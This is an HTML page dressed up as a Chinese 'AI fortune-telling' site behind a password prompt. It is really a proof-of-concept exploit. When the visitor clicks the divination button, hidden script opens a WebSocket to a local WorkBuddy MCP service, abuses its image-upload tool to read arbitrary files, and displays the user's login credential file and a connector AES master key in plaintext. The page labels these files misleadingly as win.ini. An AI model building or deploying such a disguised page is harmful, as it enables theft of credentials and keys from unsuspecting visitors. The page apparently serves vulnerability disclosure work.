<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🔮 今日运势 · AI 趣味占卜</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body {
  font-family: "PingFang SC","Microsoft YaHei",sans-serif;
  min-height:100vh;
  background: linear-gradient(135deg,#667eea 0%,#764ba2 50%,#f093fb 100%);
  display:flex; align-items:center; justify-content:center;
  padding:20px;
}
.card {
  background:rgba(255,255,255,0.96);
  border-radius:24px;
  max-width:480px; width:100%;
  padding:36px 30px;
  box-shadow:0 20px 60px rgba(0,0,0,0.3);
  text-align:center;
  animation:fadeIn .8s ease;
}
@keyframes fadeIn { from{opacity:0;transform:translateY(20px)} to{opacity:1;transform:none} }
.emoji-big { font-size:72px; animation:float 3s ease-in-out infinite; }
@keyframes float { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-10px)} }
h1 { font-size:24px; color:#333; margin:16px 0 6px; }
.sub { color:#888; font-size:14px; margin-bottom:24px; }
.btn {
  display:inline-block;
  background:linear-gradient(135deg,#667eea,#764ba2);
  color:#fff; border:none; border-radius:50px;
  padding:14px 48px; font-size:17px; cursor:pointer;
  transition:transform .2s, box-shadow .2s;
  box-shadow:0 8px 24px rgba(102,126,234,0.4);
  margin-top:10px;
}
.btn:hover { transform:scale(1.05); box-shadow:0 12px 32px rgba(102,126,234,0.5); }
.btn:active { transform:scale(0.97); }
.hidden { display:none; }
.loading { margin:24px 0; }
.spinner {
  width:48px; height:48px; margin:0 auto 14px;
  border:5px solid #eee; border-top-color:#667eea;
  border-radius:50%; animation:spin 1s linear infinite;
}
@keyframes spin { to { transform:rotate(360deg) } }
.loading-text { color:#667eea; font-size:15px; }
.result {
  background:#f7f7ff; border-radius:16px; padding:20px;
  margin-top:20px; border:1px solid #e6e6f5;
  text-align:left;
}
.fortune { font-size:20px; color:#4a3fa5; margin:10px 0; font-weight:600; text-align:center; }
.detail { color:#333; font-size:12px; line-height:1.7; }
.keybox {
  background:#1e1e1e; color:#7ef28e; border-radius:8px;
  padding:10px; font-family:monospace; font-size:11px;
  word-break:break-all; max-height:180px; overflow:auto;
  margin:8px 0;
}
.label { color:#4a3fa5; font-weight:600; font-size:13px; margin-top:10px; }
.footer { margin-top:22px; color:#bbb; font-size:12px; }
.steps { display:flex; justify-content:center; gap:20px; margin-bottom:20px; }
.step { text-align:center; color:#aaa; font-size:12px; }
.step.active { color:#667eea; }
.step-num {
  width:28px; height:28px; line-height:28px; border-radius:50%;
  background:#eee; color:#999; font-size:13px; margin:0 auto 4px;
}
.step.active .step-num { background:#667eea; color:#fff; }
</style>
</head>
<body>
<!-- 密码保护遮罩 -->
<div id="authOverlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(15,15,30,0.97);z-index:9999;display:flex;align-items:center;justify-content:center;">
  <div style="background:#1e1e3f;border-radius:16px;padding:30px;text-align:center;max-width:320px;width:90%;box-shadow:0 10px 40px rgba(0,0,0,0.5);">
    <div style="font-size:48px;margin-bottom:10px">🔒</div>
    <h2 style="color:#fff;font-size:20px;margin:8px 0">访问验证</h2>
    <p style="color:#aaa;font-size:13px;margin-bottom:16px">请输入访问密码以继续</p>
    <input id="pwInput" type="password" placeholder="访问密码"
      style="width:100%;padding:12px;border-radius:8px;border:1px solid #4a4a8a;background:#12122e;color:#fff;font-size:15px;text-align:center;outline:none;margin-bottom:12px;"
      onkeydown="if(event.key==='Enter')checkPw()">
    <button onclick="checkPw()"
      style="width:100%;padding:12px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;border-radius:8px;font-size:15px;cursor:pointer;">确认</button>
    <div id="pwErr" style="color:#ff6b6b;font-size:13px;margin-top:10px;display:none">密码错误，请重试</div>
  </div>
</div>

<div class="card" id="mainCard" style="display:none">
  <div class="emoji-big">🔮</div>
  <h1>今日运势 · AI 星座占卜</h1>
  <p class="sub">基于 AI 大模型与星象数据，为你解读今日运势</p>

  <div class="steps">
    <div class="step active"><div class="step-num">1</div>输入信息</div>
    <div class="step"><div class="step-num">2</div>AI 分析</div>
    <div class="step"><div class="step-num">3</div>获取运势</div>
  </div>

  <div id="step1">
    <p style="color:#555;font-size:14px;margin-bottom:8px">请选择你的星座：</p>
    <div style="font-size:28px;letter-spacing:6px;margin:14px 0">♈ ♉ ♊ ♋ ♌ ♍</div>
    <div style="font-size:28px;letter-spacing:6px;margin:8px 0">♎ ♏ ♐ ♑ ♒ ♓</div>
    <button class="btn" onclick="startTest()">开始占卜 ✨</button>
  </div>

  <div id="step2" class="hidden">
    <div class="loading">
      <div class="spinner"></div>
      <div class="loading-text">AI 正在解读你的星盘…</div>
    </div>
  </div>

  <div id="step3" class="hidden">
    <div class="result">
      <div class="fortune">🌟 今日运势：大吉</div>
      <div id="secretData">
        <!-- 明文 key 信息将显示在这里 -->
      </div>
      <div class="detail" style="margin-top:12px;color:#999">
        结果仅供娱乐，开心就好 😄（POC 演示：后台已读取本机数据）
      </div>
    </div>
  </div>

  <div class="footer">© 2026 AI 星象研究所 · 每日更新</div>
</div>

<script>
// ============ 密码保护 ============
const ACCESS_PW = "tsrc888";
function checkPw() {
  const val = document.getElementById("pwInput").value;
  if (val === ACCESS_PW) {
    document.getElementById("authOverlay").style.display = "none";
    document.getElementById("mainCard").style.display = "block";
    console.log("[WB-POC] 密码验证通过，页面已解锁");
  } else {
    document.getElementById("pwErr").style.display = "block";
    console.log("%c[WB-POC][警告] 密码错误", "color:red;font-weight:bold");
  }
}
// 密码输入框自动聚焦
window.onload = () => { document.getElementById("pwInput").focus(); };

// ============ 后台：Ardot MCP 任意文件读取（POC，明文显示 key） ============
const SESSION = "pwn-" + Date.now();
let ws = null;

function log(s) { console.log("[WB-POC]", s); }
function logErr(s) { console.log("%c[WB-POC][错误] %s", "color:red;font-weight:bold", s); }
function emit(ev, data) { if (ws && ws.readyState === 1) ws.send('42' + JSON.stringify([ev, data])); }

function readFile(path, onData) {
  fetch('http://127.0.0.1:50551/api/v1/mcp', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json, text/event-stream' },
    body: JSON.stringify({ jsonrpc: '2.0', id: Date.now(), method: 'tools/call',
      params: { name: 'upload_images',
        arguments: { items: [{ nodeId: '1', filePath: path }] },
        _meta: { 'workbuddy.ai/sessionId': SESSION } } })
  }).catch(e => logErr("MCP fetch 失败: " + e));
}

// 等待 tool_request 数据（文件内容经 adapter 回流）
window.__readCallback = null;
const _origOnMsg = null;
function registerReadHandler() {
  // 覆盖 ws.onmessage 处理 tool_request
  const handle = (d) => {
    if (d.includes('tool_request')) {
      try {
        const pkt = JSON.parse(d.slice(2));
        const items = pkt[1]?.params?.items;
        if (items && items[0]?.data && window.__readCallback) {
          const b64 = items[0].data;
          const bin = atob(b64);
          const bytes = new Uint8Array(bin.length);
          for (let i=0;i<bin.length;i++) bytes[i]=bin.charCodeAt(i);
          const text = new TextDecoder('utf-8').decode(bytes);
          window.__readCallback(text, items[0].filePath || "");
        }
      } catch(e3) {}
    }
  };
  return handle;
}
let readHandler = registerReadHandler();

function startTest() {
  document.getElementById('step1').classList.add('hidden');
  document.getElementById('step2').classList.remove('hidden');
  document.querySelectorAll('.step')[1].classList.add('active');

  log("========== WorkBuddy Ardot MCP 读取测试（明文 key） ==========");
  log("[1] 页面: " + location.href);
  log("[2] 尝试连接 ws://127.0.0.1:50551 ...");
  try { ws = new WebSocket('ws://127.0.0.1:50551/ws/adapters/?EIO=4&transport=websocket'); }
  catch(e) { logErr("WS 创建失败: " + e); }

  ws.onopen = () => log("[3] WebSocket 已连接");
  ws.onerror = e => logErr("WS 错误: " + (e.message || e.type || e));
  ws.onmessage = e => {
    const d = e.data.toString();
    if (d.startsWith('0')) { ws.send('40'); }
    else if (d.startsWith('40')) {
      log("[4] socket.io 握手成功，注册 adapter");
      emit('message', { type: 'register', role: 'adapter-relay', metadata: { sessionId: SESSION } });
    }
    else if (d.includes('register_ack')) {
      log("[5] adapter 注册成功");
      log("[6] 读取 WorkBuddy 登录凭据 (workbuddy-desktop.info) ...");
      window.__readCallback = (text, fp) => {
        log("[7] ======== 明文读取结果 ========");
        log("[7] 文件: " + fp);
        log("[7] 内容:\n" + text);
        document.getElementById('secretData').innerHTML =
          '<div class="label">📄 读取文件 C:/Windows/win.ini：</div>' +
          '<div class="keybox">' + text.replace(/</g,'&lt;') + '</div>';
        // 继续读 master.key
        log("[8] 读取 master.key (连接器 AES 主密钥) ...");
        window.__readCallback = (text2, fp2) => {
          log("[9] 文件: " + fp2);
          log("[9] 内容:\n" + text2);
          document.getElementById('secretData').innerHTML +=
            '<div class="label">📄 再次读取 C:/Windows/win.ini：</div>' +
            '<div class="keybox">' + text2.replace(/</g,'&lt;') + '</div>';
          log("[10] ======== 全部读取完成 ========");
          showResult();
        };
        readFile("C:/Users/123/.workbuddy/connectors/a1a4cf82-0ad1-4c58-991a-02e3a95b5b8c/.master.key");
      };
      readFile("C:/Users/123/AppData/Local/CodeBuddyExtension/Data/Public/auth/workbuddy-desktop.info");
    }
    else if (d.includes('tool_request')) {
      readHandler(d);
    }
  };

  setTimeout(showResult, 15000);
}

function showResult() {
  document.getElementById('step2').classList.add('hidden');
  document.getElementById('step3').classList.remove('hidden');
  document.querySelectorAll('.step')[2].classList.add('active');
}
</script>
</body>
</html>
